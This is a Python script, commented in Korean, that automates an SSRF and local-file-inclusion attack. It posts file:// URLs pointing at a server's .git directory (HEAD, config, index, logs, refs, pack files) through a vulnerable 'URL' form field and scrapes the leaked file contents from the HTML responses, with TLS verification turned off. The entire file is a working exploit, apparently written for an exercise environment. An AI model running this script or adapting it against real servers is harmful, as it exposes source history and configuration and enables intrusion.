import requests
from bs4 import BeautifulSoup
import urllib3

#상위 config.py 접근하기 위해해
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from config import TARGET_URL


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 대상 서버에 존재하는 .git 디렉토리의 기본 경로
GIT_BASE_PATH = "/soap/home/bteam/Desktop/_CPSS_ICS_Server/.git"

# .git 디렉토리 내에서 확인할 파일 및 하위 디렉토리의 포괄적인 목록
paths_to_check = [
    "",                     # .git 디렉토리 자체
    "/HEAD",                # 현재 브랜치 포인터
    "/config",              # 저장소 설정
    "/index",               # 스테이징 영역 정보
    "/description",         # 저장소 설명
    "/COMMIT_EDITMSG",      # 마지막 커밋 메시지
    "/FETCH_HEAD",          # 마지막으로 fetch한 원격 브랜치 정보
    "/ORIG_HEAD",           # HEAD의 이전 상태 포인터
    "/packed-refs",         # 압축된 참조(브랜치, 태그) 정보
    
    # 디렉토리들
    "/hooks",
    "/info",
    "/info/exclude",
    "/branches",

    # 로그 파일들
    "/logs/",
    "/logs/HEAD",
    "/logs/refs/heads/main",
    "/logs/refs/heads/master", # master 브랜치일 경우

    # 참조(브랜치) 파일들
    "/refs/",
    "/refs/heads/",
    "/refs/heads/main",
    "/refs/heads/master",
    "/refs/tags/",
    "/refs/remotes/",

    # 객체 관련 정보 (개별 객체 해시는 추측 불가)
    "/objects/",
    "/objects/info/",
    "/objects/info/packs",
    "/objects/pack/"
]


print("========== SSRF + LFI 자동화 시작 (div 기반) ==========")

for p in paths_to_check:
    # 전체 파일 경로 조합
    full_path = f"{GIT_BASE_PATH}{p}"
    payload = f"file://{full_path}"
    print(f"[+] 요청 중: {payload}")
    try:
        res = requests.get(
            TARGET_URL,
            data={"URL": payload},
            verify=False,
            timeout=5
        )

        soup = BeautifulSoup(res.text, "html.parser")
        contents = []

        # div 태그 중 overflow: auto 스타일을 가진 것
        div = soup.find("div", style=lambda s: s and "overflow: auto" in s)
        if div and div.text.strip():
            contents.append(div.text.strip())

        # p 태그 (선택적으로 추가)
        p_tag = soup.find("p")
        if p_tag and p_tag.text.strip():
            contents.append(p_tag.text.strip())

        if contents:
            print(f"[✔] {full_path} 내용 일부:\n" + "\n---\n".join(contents) + "\n")
        else:
            print(f"[!] {full_path}는 비어 있음 또는 태그 없음\n")

    except Exception as e:
        print(f"[!] 오류 발생: {e}\n")


print("========== SSRF + LFI 자동화 종료 ==========")
